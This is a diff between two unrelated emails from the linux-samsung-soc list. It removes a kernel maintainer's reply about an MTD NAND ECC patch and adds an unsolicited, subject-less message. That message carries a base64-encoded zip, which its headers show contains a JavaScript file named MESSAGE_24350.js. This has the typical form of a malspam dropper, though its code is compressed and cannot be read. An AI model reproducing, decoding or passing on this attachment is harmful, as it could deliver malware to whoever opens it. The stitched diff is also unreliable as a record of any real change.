@@ -1,77 +1,107 @@
-From: Krzysztof Kozlowski <krzk@kernel.org>
-Subject: Re: [PATCH v3 1/3] mtd: s3c2410: make ecc mode configurable via
- platform data
-Date: Sat, 22 Oct 2016 18:32:08 +0300
-Message-ID: <20161022153208.GA3830@kozik-lap>
-References: <1476999766-32526-1-git-send-email-sergio.prado@e-labworks.com>
- <1476999766-32526-2-git-send-email-sergio.prado@e-labworks.com>
- <20161021182710.GA17279@kozik-lap>
- <20161022142907.08a3eedf@bbrezillon>
+From: <rueggemann@h.maus.de>
+Subject: (unknown)
+Date: Sat, 22 Oct 2016 18:26:32 -0000
+Message-ID: <147716079258.5995.10282399104641999677@redewsp.com.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
+Content-Type: application/zip; name="EMAIL_6923158673_linux-samsung-soc.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-Received: from mail-wm0-f65.google.com ([74.125.82.65]:33702 "EHLO
-        mail-wm0-f65.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S934425AbcJVPco (ORCPT
+Received: from 144-94-184-177.redewsp.com.br ([177.184.94.144]:54019 "HELO
+        redewsp.com.br" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751241AbcJVS0k (ORCPT
         <rfc822;linux-samsung-soc@vger.kernel.org>);
-        Sat, 22 Oct 2016 11:32:44 -0400
-Content-Disposition: inline
-In-Reply-To: <20161022142907.08a3eedf@bbrezillon>
+        Sat, 22 Oct 2016 14:26:40 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-samsung-soc-owner@vger.kernel.org
 List-Id: linux-samsung-soc@vger.kernel.org
-To: Boris Brezillon <boris.brezillon@free-electrons.com>
-Cc: Krzysztof Kozlowski <krzk@kernel.org>, Sergio Prado <sergio.prado@e-labworks.com>, kgene@kernel.org, javier@osg.samsung.com, linux@armlinux.org.uk, linux@simtec.co.uk, richard@nod.at, dwmw2@infradead.org, computersforpeace@gmail.com, linux-arm-kernel@lists.infradead.org, linux-samsung-soc@vger.kernel.org, linux-kernel@vger.kernel.org, linux-mtd@lists.infradead.org, robh+dt@kernel.org, mark.rutland@arm.com, devicetree@vger.kernel.org
+To: linux-samsung-soc@vger.kernel.org
 
-On Sat, Oct 22, 2016 at 02:29:07PM +0200, Boris Brezillon wrote:
-> Hi Krzysztof,
-> 
-> On Fri, 21 Oct 2016 21:27:10 +0300
-> Krzysztof Kozlowski <krzk@kernel.org> wrote:
-> 
-> > On Thu, Oct 20, 2016 at 07:42:44PM -0200, Sergio Prado wrote:
-> > > Removing CONFIG_MTD_NAND_S3C2410_HWECC option and adding a ecc_mode
-> > > field in the drivers's platform data structure so it can be selectable
-> > > via platform data.
-> > > 
-> > > Also setting this field to NAND_ECC_SOFT in all boards using this
-> > > driver since none of them had CONFIG_MTD_NAND_S3C2410_HWECC enabled.
-> > > 
-> > > Signed-off-by: Sergio Prado <sergio.prado@e-labworks.com>
-> > > ---
-> > >  arch/arm/mach-s3c24xx/common-smdk.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-anubis.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-at2440evb.c         |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-bast.c              |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-gta02.c             |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-jive.c              |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-mini2440.c          |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-osiris.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-qt2410.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-rx1950.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-rx3715.c            |   1 +
-> > >  arch/arm/mach-s3c24xx/mach-vstms.c             |   1 +
-> > >  arch/arm/mach-s3c64xx/mach-hmt.c               |   1 +
-> > >  arch/arm/mach-s3c64xx/mach-mini6410.c          |   1 +
-> > >  arch/arm/mach-s3c64xx/mach-real6410.c          |   1 +
-> > >  drivers/mtd/nand/Kconfig                       |   9 --
-> > >  drivers/mtd/nand/s3c2410.c                     | 119 +++++++++++++------------
-> > >  include/linux/platform_data/mtd-nand-s3c2410.h |   6 +-
-> > >  18 files changed, 79 insertions(+), 70 deletions(-)
-> > >  
-> > 
-> > I acked this twice (v1 and v2)... and still you are ignoring them. I am
-> > sorry, I am not gonna to ack this third time!
-> > 
-> > For v2 I acked also other patches but it it is not there as well...
-> 
-> I'll collect your acks (and Rob ones) when applying the patches. BTW,
-> how should I proceed with patch 1? Do you want an topic branch
-> containing this patch?
-
-I don't expect much work around these files so the risk of conflicts is
-rather small. You could put it on a topic branch just in case (so I
-could pull in if needed) but I am fine with applying these to your tree
-as is.
-
-Best regards,
-Krzysztof
+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
